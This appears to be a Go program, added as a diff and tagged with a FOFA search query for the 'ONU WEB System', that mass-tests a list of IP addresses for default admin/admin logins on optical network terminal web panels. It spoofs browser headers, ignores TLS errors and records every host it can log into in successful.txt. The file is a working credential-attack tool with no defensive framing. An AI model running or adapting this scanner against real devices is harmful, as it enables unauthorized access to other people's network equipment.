@@ -1,0 +1,99 @@
+/*
+
+
+"ONU WEB System" fofa 
+
+*/
+
+
+package main
+
+import (
+	"fmt"
+	"io/ioutil"
+	"net/http"
+	"os"
+	"strings"
+	"time"
+	"crypto/tls"
+)
+
+func main() {
+	// Read IPs and ports from ips.txt
+	ipPortList, err := ioutil.ReadFile("ips.txt")
+	if err != nil {
+		fmt.Println("Error reading ips.txt:", err)
+		return
+	}
+
+	// Split the content of ips.txt into individual lines
+	ips := strings.Split(strings.TrimSpace(string(ipPortList)), "\n")
+
+	// Create a custom transport to ignore SSL certificate verification
+	tr := &http.Transport{
+		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
+	}
+
+	// Set a timeout and custom transport for the HTTP client
+	client := &http.Client{
+		Timeout:   5 * time.Second, // Adjust the timeout duration as needed
+		Transport: tr,
+	}
+
+	// Iterate over each IP:PORT combination
+	for _, ipPort := range ips {
+		IpPort := strings.TrimSpace(ipPort)
+		url := fmt.Sprintf("http://%s/weblogin.cmd?login=admin&pwd=YWRtaW4=", IpPort)
+
+		req, err := http.NewRequest("GET", url, nil)
+		if err != nil {
+			fmt.Printf("Error creating request for %s: %v\n", IpPort, err)
+			continue
+		}
+
+		req.Header.Set("Upgrade-Insecure-Requests", "1")
+		req.Header.Set("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36")
+		req.Header.Set("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7")
+		req.Header.Set("Referer", fmt.Sprintf("http://%s/", IpPort))
+		req.Header.Set("Accept-Encoding", "gzip, deflate")
+		req.Header.Set("Accept-Language", "en-US,en;q=0.9")
+		req.Header.Set("Connection", "close")
+
+		resp, err := client.Do(req)
+		if err != nil {
+			if strings.Contains(err.Error(), "Timeout") {
+				fmt.Printf("Timeout error for %s: %v\n", IpPort, err)
+				continue
+			}
+			fmt.Printf("Error sending request for %s: %v\n", IpPort, err)
+			continue
+		}
+		defer resp.Body.Close()
+
+		body, err := ioutil.ReadAll(resp.Body)
+		if err != nil {
+			fmt.Printf("Error reading response body for %s: %v\n", IpPort, err)
+			continue
+		}
+
+		if strings.Contains(string(body), `page = "index.html";`) {
+			fmt.Printf("Successful login for %s\n", IpPort)
+
+			// Write successful IP:PORT to successful.txt
+			file, err := os.OpenFile("successful.txt", os.O_APPEND|os.O_WRONLY|os.O_CREATE, 0644)
+			if err != nil {
+				fmt.Printf("Error writing to successful.txt for %s: %v\n", IpPort, err)
+				continue
+			}
+			defer file.Close()
+
+			_, err = file.WriteString(IpPort + "\n")
+			if err != nil {
+				fmt.Printf("Error writing to successful.txt for %s: %v\n", IpPort, err)
+				continue
+			}
+		} else {
+			fmt.Printf("Login was not successful for %s\n", IpPort)
+		}
+	}
+}
